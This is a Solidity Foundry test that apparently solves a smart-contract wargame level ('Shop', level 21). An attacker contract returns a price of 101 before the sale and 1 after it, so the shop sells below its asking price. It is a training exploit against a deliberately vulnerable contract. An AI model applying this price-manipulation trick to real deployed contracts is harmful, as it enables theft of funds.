// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Shop} from "../instances/Ilevel21.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        Shop shop = new Shop();
        BrokenShop brokenShop = new BrokenShop(address(shop));
        brokenShop.exploit();
        console.log("final price: %d", shop.price());
        vm.stopBroadcast();
    }
}

contract BrokenShop {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function exploit() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 101;
    }
}
